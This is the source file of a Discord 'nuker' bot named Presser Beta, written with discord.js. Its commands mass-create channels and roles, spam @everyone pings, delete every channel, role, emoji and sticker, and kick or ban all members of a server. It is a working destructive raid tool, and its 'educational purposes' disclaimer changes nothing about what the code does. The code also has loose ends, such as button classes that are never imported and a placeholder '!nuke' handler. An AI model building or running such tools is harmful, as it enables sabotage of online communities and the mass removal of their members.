/**
 * Presser Beta
 * @author sparkcodez x 7teen 
 * sub to nubprogrammer
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
    
    $$$$$$\  $$$$$$$\   $$$$$$\  $$$$$$$\  $$\   $$\       $$$$$$$\  $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\  $$$$$$$$\ $$$$$$$\  
    $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |      $$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
    $$ /  \__|$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ |$$  /       $$ |  $$ |$$ |  $$ |$$ |      $$ /  \__|$$ /  \__|$$ |      $$ |  $$ |
    \$$$$$$\  $$$$$$$  |$$$$$$$$ |$$$$$$$  |$$$$$  /        $$$$$$$  |$$$$$$$  |$$$$$\    \$$$$$$\  \$$$$$$\  $$$$$\    $$$$$$$  |
     \____$$\ $$  ____/ $$  __$$ |$$  __$$< $$  $$<         $$  ____/ $$  __$$< $$  __|    \____$$\  \____$$\ $$  __|   $$  __$$< 
    $$\   $$ |$$ |      $$ |  $$ |$$ |  $$ |$$ |\$$\        $$ |      $$ |  $$ |$$ |      $$\   $$ |$$\   $$ |$$ |      $$ |  $$ |
    \$$$$$$  |$$ |      $$ |  $$ |$$ |  $$ |$$ | \$$\       $$ |      $$ |  $$ |$$$$$$$$\ \$$$$$$  |\$$$$$$  |$$$$$$$$\ $$ |  $$ |
     \______/ \__|      \__|  \__|\__|  \__|\__|  \__|      \__|      \__|  \__|\________| \______/  \______/ \________|\__|  \__|    
                                            
                                                      
                            Beta
                    Nuker: ${nuker.user.tag}
                    Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: "Playing with spark", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**Presser Beta ;**
    \n**mass channels ;**
    ${prefix}mc [amount] (text) i.e \`${prefix}mc 5 test\`\n
    **mass channel n ping ;**
    ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 5 test, testing\`\n
    **mass roles ;**
    ${prefix}mr [amount] (text) i.e \`${prefix}mr 5 test\`\n
    **delete channels ;**
    ${prefix}dc\n
    **delete roles ;**
    ${prefix}dr\n
    **delete emotes ;**
    ${prefix}de\n
    **delete stickers (new) ;**
    ${prefix}ds\n
    **mass kick ;**
    ${prefix}mk\n
    **mass ban ;**
    ${prefix}mb
    `)
        .setFooter(`© Presser Beta`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Possible Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Used for amount
    var args2 = args.slice(1).join(' ') // Naming things
    var args3 = args.slice(2).join(', '); // Other

    if (!disableEveryone) {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "help")) {
            const helpEmbed = new MessageEmbed()
                .setTitle("Presser Beta Commands")
                .setDescription(
                    `Here are the available commands:

` +
                    `**Mass Channels:**
` +
                    `	${prefix}mc [amount] (text) - Create multiple channels.
` +
                    `**Mass Channels & Ping:**
` +
                    `	${prefix}cp [amount] (text), {message} - Create channels and ping everyone.
` +
                    `**Mass Roles:**
` +
                    `	${prefix}mr [amount] (text) - Create multiple roles.
` +
                    `**Delete Channels:**
` +
                    `	${prefix}dc - Delete all channels.
` +
                    `**Delete Roles:**
` +
                    `	${prefix}dr - Delete all roles.
` +
                    `**Delete Emotes:**
` +
                    `	${prefix}de - Delete all emojis.
` +
                    `**Delete Stickers:**
` +
                    `	${prefix}ds - Delete all stickers.
` +
                    `**Mass Kick:**
` +
                    `	${prefix}mk - Kick all members.
` +
                    `**Mass Ban:**
` +
                    `	${prefix}mb - Ban all members.`
                )
                .setColor("#7289DA")
                .setFooter("Presser Beta | For educational purposes only.")
                .setTimestamp();

            message.channel.send({ embeds: [helpEmbed] });
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

    // Nuking Functions

    /**
     * Creates multiple channels in the server.
     * @param {number} amount - Number of channels to create.
     * @param {string} channelName - Name of the channels to create.
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Please specify the number of channels to create.");
            if (isNaN(amount)) return reject("Invalid input: Amount must be a number.");
            if (amount > 500) return reject("Limit exceeded: Maximum channel count is 500.");
            if (!channelPerms) return reject("Missing Permissions: 'MANAGE_CHANNELS' required.");

            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                const name = channelName || `${message.author.username}'s channel`;
                message.guild.channels.create(name, { type: "GUILD_TEXT" }).catch((err) => {
                    console.error("Error creating channel:", err);
                });
            }
            resolve();
        });
    }

    /**
     * Deletes all channels in the server.
     */
    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Missing Permissions: 'MANAGE_CHANNELS' required.");
            message.guild.channels.cache.forEach((channel) => {
                channel.delete().catch((err) => {
                    console.error("Error deleting channel:", err);
                });
            });
            resolve();
        });
    }

    /**
     * Excessive amount of roles
     * @param {number} amount Amount of roles
     * @param {string} roleName Role name
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                }
            }
        })
    }

    /**
     * Deletes all roles
     */
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    /**
     * Deletes all emotes
     */
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    /**
     * Deletes all stickers
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    /**
     * Ban all guild Members
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * Kick all guild Members
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
                    }
                }, 2000);
            })
        })
    }

    // Secure Button-Based Action Template for !nuke Command
    if (message.content.startsWith(prefix + "nuke")) {
        if (message.author.id !== userID) {
            return message.reply("You are not authorized to use this command.");
        }

        const nukeEmbed = new MessageEmbed()
            .setTitle("Nuke Command Confirmation")
            .setDescription("Are you sure you want to execute the nuke command? Click the button below to confirm.")
            .setColor("#FF0000")
            .setFooter("Presser Beta | For educational purposes only.")
            .setTimestamp();

        const confirmButton = new MessageActionRow().addComponents(
            new MessageButton()
                .setCustomId("confirm_nuke")
                .setLabel("Confirm")
                .setStyle("DANGER")
        );

        message.channel.send({ embeds: [nukeEmbed], components: [confirmButton] });

        const filter = (interaction) => interaction.customId === "confirm_nuke" && interaction.user.id === userID;
        const collector = message.channel.createMessageComponentCollector({ filter, time: 15000 });

        collector.on("collect", async (interaction) => {
            await interaction.reply("Nuke command executed successfully.");
            // Add the actual nuke logic here, ensuring it is safe and non-destructive.
        });

        collector.on("end", (collected) => {
            if (collected.size === 0) {
                message.channel.send("Nuke command timed out. No action was taken.");
            }
        });
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
// sub to nubprogrammer
